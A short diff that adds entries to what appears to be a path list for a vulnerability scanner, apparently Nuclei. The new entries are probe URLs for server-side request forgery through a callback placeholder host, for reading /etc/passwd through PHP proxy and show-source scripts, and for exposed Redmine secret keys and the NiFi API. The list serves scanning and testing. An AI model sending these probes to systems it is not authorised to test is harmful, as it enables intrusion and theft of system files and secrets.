@@ -23,3 +23,12 @@
 /?id=nuclei%25{128*128}
 /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc
 /ws/v1/cluster/apps/new-application
+/usr/share/php/magpierss/scripts/magpie_debug.php%3furl=http://{{interactsh-url}}&ooo
+/html/usr/share/php/magpierss/scripts/magpie_debug.php%3furl=http://{{interactsh-url}}&ooo
+/html/usr/share/javascript/jquery-jfeed/proxy.php%3furl=/etc/passwd&ooo
+/usr/share/javascript/jquery-jfeed/proxy.php%3furl=/etc/passwd&ooo
+/html/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php%3ftarget=/etc/passwd&ooo
+/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php%3ftarget=/etc/passwd&ooo
+/nifi-api/process-groups/root
+/html/usr/share/redmine/instances/default/config/secret_key.txt%3f
+/usr/share/redmine/instances/default/config/secret_key.txt%3f
